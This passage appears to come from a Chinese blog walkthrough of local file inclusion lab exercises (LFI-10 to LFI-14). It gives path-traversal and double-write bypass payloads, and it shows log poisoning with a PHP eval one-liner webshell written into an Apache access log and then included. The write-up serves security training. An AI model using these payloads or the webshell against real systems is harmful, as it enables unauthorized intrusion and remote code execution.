class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class=../../../../../phpinfo</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010958041.png\" alt=\"image-20221020010958041\"></p>\n<h2 id=\"lfi-10\"><a class=\"markdownIt-Anchor\" href=\"#lfi-10\">#</a> LFI-10</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011102011.png\" alt=\"image-20221020011102011\"></p>\n<h2 id=\"lfi-11\"><a class=\"markdownIt-Anchor\" href=\"#lfi-11\">#</a> LFI-11</h2>\n<p>这题使用了隐藏字段进行传递参数</p>\n<p><img src=\"image-20221020011255262.png\" alt=\"image-20221020011255262\"></p>\n<p>那么可以有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">stylepath=../../../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011208724.png\" alt=\"image-20221020011208724\"></p>\n<h2 id=\"lfi-12\"><a class=\"markdownIt-Anchor\" href=\"#lfi-12\">#</a> LFI-12</h2>\n<p>还是使用隐藏字段传递，只不过变成了 <code>GET</code>  型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-12/?stylepath=../../../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011415134.png\" alt=\"image-20221020011415134\"></p>\n<h2 id=\"lfi-13\"><a class=\"markdownIt-Anchor\" href=\"#lfi-13\">#</a> LFI-13</h2>\n<p>依旧是双写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-13/?file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011537265.png\" alt=\"image-20221020011537265\"></p>\n<h2 id=\"lfi-14\"><a class=\"markdownIt-Anchor\" href=\"#lfi-14\">#</a> LFI-14</h2>\n<p>变成了 <code>POST</code>  型，使用双写绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011651144.png\" alt=\"image-20221020011651144\"></p>\n<h2 id=\"包含日志文件获取webshell\"><a class=\"markdownIt-Anchor\" href=\"#包含日志文件获取webshell\">#</a> 包含日志文件获取 webshell</h2>\n<p><img src=\"image-20221020011757179.png\" alt=\"image-20221020011757179\"></p>\n<p>我们通过 <code>httpd-vhosts.conf</code>  可以知道：</p>\n<p><img src=\"image-20221020012214942.png\" alt=\"image-20221020012214942\"></p>\n<p>我们的网页日志存储在 <code>logs/dummy-host2.asdf-access.log</code>  中</p>\n<p>那么我们通过文件包含去请求一句话木马，看是否会留下痕迹？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p>那我们构造：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=<span class=\"meta\">&lt;?php @eval($_POST[jack]);?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>接着查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=../../../Apache/logs/dummy-host2.asdf-access.log</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020013521115.png\" alt=\"image-20221020013521115\"></p>\n<p>发现 <code>尖括号</code> 和 <code>空格</code> 会被 URL 编码，这时候我们使用 <code>BP</code>  抓包修改</p>\n<p><img src=\"image-20221020013627512.png\" alt=\"image-20221020013627512\"></p>\n<p><img src=\"image-20221020014143191.png\" alt=\"image-20221020014143191\"></p>\n",
            "tags": [
                "文件包含探究"
            ]
        }
    ]
}